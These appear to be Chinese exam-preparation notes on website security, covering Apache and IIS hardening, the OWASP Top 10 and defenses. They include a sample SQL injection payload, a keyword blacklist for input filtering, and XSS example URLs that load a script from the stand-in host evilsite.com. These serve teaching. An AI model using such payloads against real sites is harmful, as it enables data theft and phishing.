# 信息安全工程师（第二版）章二十二：网站安全需求分析与安全保护工程


## 一、网站安全威胁与需求分析

### 1-1 网站安全概念

网站安全主要是有关网站的机密性、完整性、可用性及可控性

  * 机密性：网站信息及相关数据不被**未授权查看或泄露**
  * 完整性：网站的信息及数据不能被**非授权修改** ，网站服务不能被**劫持**
  * 可用性：网站持续为相关用户提供**不中断服务** 的能力
  * 可控性：网站的责任主体及运营者对网站的**管理及控制** 的能力，网站不被恶意利用

### 1-2 网站安全分析

  1. **非授权访问** （认证机制安全缺陷）
  2. **网页篡改** （相关组件被攻击者利用）
  3. **数据泄露** （访问控制措施不当）
  4. **恶意代码**
  5. **网站假冒** （域名欺骗、网站劫持、中间人攻击）
  6. **拒绝服务** （协议缺陷）
  7. **网站后台管理安全威胁** （管理员账号安全性、后台管理程序安全性、内部管理权限安全性）

### 1-3 网站安全需求

  * 物理环境
  * 网络通信
  * 操作系统
  * 数据库
  * 应用服务器
  * Web 服务软件
  * Web 应用程序
  * 数据安全

## 二、Apache Web 安全分析与增强

### 2-1 Apache Web 概述

Apache Httpd 配置文件：

  1. httpd.conf 主配置文件，启动时先读取，定义 Apache 服务器一般属性、端口、执行者身份
  2. conf/srm.conf 数据配置文件，设置读取文件目录、目录索引画面、CGI 执行目录
  3. conf/access.conf 基本读取文件控制，限制目录所能执行的功能及访问目录的权限
  4. conf/mime.conf 设定 Apache 能辨别的 MIME 格式

### 2-2 Apache Web 安全分析

  1. Apache Web 软件程序威胁
  2. Apache Web 软件配置威胁
  3. Apache Web 安全机制威胁
  4. Apache Web 应用程序威胁
  5. Apache Web 服务通信威胁
  6. Apache Web 服务内容威胁
  7. Apache Web 服务器拒绝服务威胁

### 2-3 Apache Web 安全机制

  1. Apache Web 本地文件安全（chmod）
  2. Apache Web 模块管理机制（模块化控制机制适应安全需求）
  3. Apache Web 认证机制
  4. 连接耗尽应对机制（①减少 Apache 超时设置、增大 MaxClients 设置；②通过防火墙或xinetd 限制同一 IP 的最大连接数；③根据 User_Agent 判断多线程下载）
  5. Apache Web 自带的访问控制机制（access.conf 对 IP 或域名进行黑白名单限制）
  6. Apache Web 审计和日志（access.log、error.log）
  7. Apache Web 服务器防范 DoS（Apache DoS Evasive Maneuvers Module 模块实现）

### 2-4 Apache Web 安全增强（考点：※※※※※）

  1. **及时安装 Apache Web 补丁**
  2. **启用 .htaccess 文件保护网页** （配置文件，能够设置网页密码、设置错误响应、禁止读取文件名、重新导向文件、加上 MIME 类别）
  3. **为 Apache Web 服务软件设置专门的用户和组** （最小权限原则）
  4. **隐藏 Apache Web 软件的版本号** （httpd.conf-->ServerSignature Off && ServerTokens Prod）
  5. **Apache Web 目录访问安全增强** （①设置禁止使用目录索引文件；②禁止默认访问；③禁止用户重载）
  6. **Apache Web 文件目录保护**
  7. **删除 Apache Web 默认目录或不必要文件** （①Apache 源代码文件；②默认 HTML 文件；③CGI 程序样例；④默认用户文件）
  8. **使用第三方如那件安全增强 Apache Web 服务** （①构建 Apache Web 服务器“安全沙箱”；②使用 OpenSSL 增强 Apache Web 安全通信；③增强 Apache Web 服务器访问控制）

## 三、IIS 安全分析与增强

### 3-1 IIS 安全分析

  1. 非授权访问（通过配置失误或系统漏洞，非法方位 IIS 资源）
  2. 网络蠕虫（缓冲区溢出漏洞）
  3. 网页篡改（网站漏洞）
  4. 拒绝服务（HTTP 协议漏洞）
  5. IIS 软件漏洞（CVE 涉及拒绝服务、代码执行、特权提升、安全旁路、XSS、内存泄漏等）

### 3-2 IIS 安全机制

**3-2-1 IIS 认证机制**

  * 匿名认证（Anonymous Authentication）
  * 基本验证（Basic Authentication）
  * 证书认证（Certificate Mapping Authentication）
  * 数字签名认证（Digest Authentication）
  * IIS 证书认证（IIS Certificate Mapping Authentication）
  * Windows 认证（Windows Authentication）

**3-2-2 IIS 访问控制**

访问控制方法：

  * 请求过滤（Request Filtering）
  * URL 授权控制（URL Authorization）
  * IP 地址限制（IP Restriction）
  * 文件授权

访问控制过程：

  1. 用户浏览器所在 IP 地址是否收到限制？
  2. 用户身份验证是否通过？
  3. 在 IIS 中指定的 Web 权限是否允许用户访问？
  4. 用户正在进行的操作请求是否符合相应 Web 文件或文件夹的 NTFS 许可权限？
  5. 用户通过上述访问控制即可访问其请求的资源

**3-2-3 IIS 日志审计**

IIS 日志审计机制，还包括操作系统、数据库、应用服务日志审计

### 3-3 IIS 安全增强（考点：※※※※）

  1. 及时安装 IIS 补丁
  2. 启用动态 IP 限制（Dynamic IP Restrictions）
  3. 启用 URLScan
  4. 启用 IIS Web 应用防火墙（Web Application Firewall）
  5. 启用它 SSL 服务

## 四、Web 应用漏洞分析与防护

### 4-1 Web 应用安全概述

  * 技术安全漏洞：技术处理不当产生的安全隐患 （SQL 注入、跨站脚本 XSS、恶意文件执行、非安全对象引用）
  * 业务逻辑安全漏洞（密码验证缺陷、安全机制缺失）

### 4-2 OWASP TOP 10

  1. A1-注入漏洞（Injection）：将不受信任的数据作为命令或查询的一部分发送到解析器时，导致产生注入漏洞（SQL 注入漏洞、NoSQL 注入、OS 注入、LDAP 注入）
  2. A2-遭受破坏的认证（Broken Authentication）
  3. A3-敏感数据暴露漏洞（Sensitive Data Exposure）
  4. A4-XML 外部实体引用漏洞（XML External Entities，XXE）
  5. A5-受损害的访问控制漏洞（Broken Access Control）
  6. A6-安全配置错误（Security Misconfiguration）
  7. A7-跨站脚本漏洞（Cross-Site Scriping，XSS）
  8. A8-非安全反序列化漏洞（Insecure Deserialization）
  9. A9-使用含有已知漏洞的组件（Using Components with Known Vulnerability）
  10. A10-非充分的日志记录和监控（Insufficient Logging and Monitoring）

### 4-3 SQL 注入（考点：※※※※※※）

**攻击特点** ：攻击者利用 Web 应用程序中未对程序变量进行安全过滤处理，再输入程序变量参数时，故意构造特殊的 SQL
语句，让后台数据库执行非法指令，从而操控数据库内容，达到攻击目的。注入的基本条件：

  1. **用户能够控制输入**
  2. **原本出程序要执行的代码，拼接了用户输入的数据**

示例：

    
    
    正常提交：http://duck/index.asp?category=food
    查询语句：SELECT * FROM product WHERE Category='food'
    查询结果：food 相关信息
    
    注入提交：http://duck/index.asp?category=food' or 1=1--
    查询语句：SELECT * FROM product WHERE Category='food' or 1=1--'
    查询结果：food 相关信息   product 表的所有信息

防范方法：

  1. 对应用程序输入进行安全过滤（对输入变量进行安全过滤和参数验证，黑名单：insert、update、delete、or、drop；白名单）
  2. 设置应用程序最小化权限（减小攻击破坏影响）
  3. 屏蔽应用程序错误提示信息（错误提示信息可能包含 ODBC 类型、数据库引擎、名称、表名称、变量、错误类型等）
  4. 对开源 Web 应用程序做安全适应性改造

### 4-4 文件上传漏洞分析与保护

**攻击特点** ：由于 Web 应用程序代码未对用户提交的文件进行**严格的分析和检查** ，攻击者可以执行上传文件，从而获取网站控制权限。

防范方法：

  * 将上传目录设置为不可执行，避免上传文件远程触发执行
  * 检查上传文件的安全性，阻断恶意文件上传

### 4-5 跨站脚本攻击 （Cross-Site Scripting Attack，XSS ）

攻击特点：利用网站中的漏洞，在 URL 注入一些恶意的脚本，篡改网页，欺骗用户

示例：

    
    
    HTML 内容替换：
    http://mybank.com/ebanking?URL=http://evilsite.com/phishing/fakepage.html
    嵌入脚本内容：
    http://mybank.com/ebganking?page=1&client=<SCRIPT>evilcode
    强制网页加载外部的脚本：
    http://mybank.com/ebanking?page=1&response=evilsite.com%21evilcode.js&go=2

## 五、网站安全保护机制与技术方案

### 5-1 网站安全保护机制（考点：※※※）

  1. **身份鉴别** （标识+鉴别：用户名+口令；U盾、人脸识别、证书）
  2. **访问控制** （防火墙、数据加密、各类内置访问控制措施）
  3. **网站内容安全** （文字内容安全检查、网页防篡改、敏感词汇过滤）
  4. **网站数据安全** （数据隔离、数据加密、SSL、数据备份、隐私保护）
  5. **网站安全防护** （非授权访问、暴力破解、DDoS、目录遍历、注入）
  6. **网站安全审计与监控** （日志记录、流量截取、入侵检测、电子取证）
  7. **网站应急响应** （网页防篡改、域名服务灾备、流量清洗、灾备中心、攻击取证）
  8. **网站合规管理** （网站备案、网站防伪标识、网站等保测评）
  9. **网站安全测评** （漏洞扫描、渗透测试、代码审核、风险分析）
  10. **网站安全管理机制** （技术+管理）

### 5-2 网站构成组件加固（参考 CIS 标准规范）

  * 操作系统安全加固
  * 数据库系统安全加固
  * Web 服务器软件安全加固
  * Web 应用程序安全加固
  * Web 通信安全加固
  * 网站域名服务安全加固
  * 网站后台管理安全加固

### 5-3 网站攻击防护及安全监测

  1. 防火墙（包过滤防火墙、应用防火墙）
  2. 漏洞扫描（端口、Web 漏洞、WebShell 检测）
  3. 网站防篡改（操作系统文件调用事件检测；单项函数生成摘要检测）
  4. 网络流量清洗
  5. 网站安全监测（漏洞监测、挂马检测、ICP 备案监测、性能监测、DNS 监测、入侵检测）
